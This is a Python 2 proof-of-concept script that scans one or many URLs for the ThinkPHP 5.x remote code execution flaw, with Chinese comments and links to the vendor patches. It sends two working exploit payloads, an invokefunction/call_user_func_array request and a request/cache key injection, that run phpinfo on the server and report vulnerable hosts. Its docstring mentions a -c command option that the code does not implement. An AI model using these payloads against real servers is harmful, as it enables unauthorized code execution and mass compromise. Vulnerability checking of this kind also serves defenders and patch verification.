# -*- coding: UTF-8 -*-
__author__ = 'orleven'
import optparse
import requests
import urllib  
requests.packages.urllib3.disable_warnings()
"""
ThinkPHP getshell
ThinkPHP 5.x (v5.0.23及v5.1.31以下版本) 
使用方法：  python poc.py  -u/-f <target url> -c <target cmd> 修复方法：
补丁地址Thinkphp v5.0.x: https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f
补丁地址Thinkphp v5.1.x: https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815
"""

def poc(url):
        flag = None
        
        if url.startswith('http://') or url.startswith('https://'):
            protocol, s1 = urllib.splittype(url)
            host, s2 = urllib.splithost(s1)
            host, port = urllib.splitport(host)
            port = port if port != None else 443 if protocol == 'https' else 80
            base_url = protocol + "://" + host + ":" + str(port) + '/'
        else:
            base_url = 'http://' + url +'/'
          
                
        headers = {}
        headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        
        for path in ['','public/']:
        
            try:                

                pocs = ["index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                            "index.php?s=/index/\\think\\request/cache&key=1|phpinfo"]
                for poc in pocs:
                    res = requests.get(base_url + path + poc, headers=headers,timeout = 3,verify = False)
                    if res != None and 'PHP Version' in res.text:
                        flag = base_url + path + poc
                        break
            except:
                pass
        if flag !=None :
             print "[+] The ThinkPHP vul is exist: %s" % flag
        else:
             print "[-] The ThinkPHP vul is not exist: %s" % base_url


def main():
    parse = optparse.OptionParser("Usage: python thinkphp_poc.py -u/-f <target url> " )
    parse.add_option('-u', dest='url', type='string', help='specify target url')
    parse.add_option('-f', dest='urlFile', type='string', help='specify target url file')
    (options, args) = parse.parse_args()
    if options.url != None:
        poc(options.url)
    elif options.urlFile != None :
        try:
            with open(options.urlFile, 'r') as f:
                for line in f.readlines():
                    poc(line.strip('\r').strip('\n'))
        
        except:
            print "[-] The File Is Not Exist !"
    else:
        print parse.usage

if __name__ == '__main__':
    main()


